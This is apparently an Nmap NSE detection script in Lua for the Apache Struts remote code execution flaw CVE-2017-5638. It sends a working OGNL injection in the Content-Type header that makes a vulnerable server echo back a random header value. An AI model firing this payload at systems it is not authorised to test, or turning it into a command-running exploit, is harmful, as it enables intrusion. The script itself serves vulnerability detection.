description = [[
Detects whether the specified URL is vulnerable to the Apache Struts
Remote Code Execution Vulnerability (CVE-2017-5638).
]]

local http = require "http"
local shortport = require "shortport"
local vulns = require "vulns"
local stdnse = require "stdnse"
local string = require "string"

---
-- @usage
-- nmap -p <port> --script http-vuln-cve2017-5638 <target>
--
-- @output
-- PORT    STATE SERVICE
-- 80/tcp  open  http
-- | http-vuln-cve2017-5638:
-- |   VULNERABLE
-- |   Apache Struts Remote Code Execution Vulnerability
-- |     State: VULNERABLE
-- |     IDs:  CVE:CVE-2017-5638
-- |
-- |     Disclosure date: 2017-03-07
-- |     References:
-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638
-- |       https://cwiki.apache.org/confluence/display/WW/S2-045
-- |_      http://blog.talosintelligence.com/2017/03/apache-0-day-exploited.html
--
-- @args http-vuln-cve2017-5638.method The HTTP method for the request. The default method is "GET".
-- @args http-vuln-cve2017-5638.path The URL path to request. The default path is "/".

author = "Seth Jackson"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = { "vuln" }

portrule = shortport.http

action = function(host, port)
  local vuln = {
    title = "Apache Struts Remote Code Execution Vulnerability",
    state = vulns.STATE.NOT_VULN,
    description = [[
Apache Struts 2.3.5 - Struts 2.3.31 and Apache Struts 2.5 - Struts 2.5.10 are vulnerable to a Remote Code Execution
vulnerability via the Content-Type header.
    ]],
    IDS = {
        CVE = "CVE-2017-5638"
    },
    references = {
        'https://cwiki.apache.org/confluence/display/WW/S2-045',
        'http://blog.talosintelligence.com/2017/03/apache-0-day-exploited.html'
    },
    dates = {
        disclosure = { year = '2017', month = '03', day = '07' }
    }
  }

  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)

  local method = stdnse.get_script_args(SCRIPT_NAME..".method") or "GET"
  local path = stdnse.get_script_args(SCRIPT_NAME..".path") or "/"
  local value = stdnse.generate_random_string(8)

  local header = {
    ["Content-Type"] = string.format("%%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Check-Struts', '%s')}.multipart/form-data", value)
  }

  local response = http.generic_request(host, port, method, path, { header = header })

  if response and response.status == 200 and response.header["x-check-struts"] == value then
    vuln.state = vulns.STATE.VULN
  end

  return vuln_report:make_output(vuln)
end
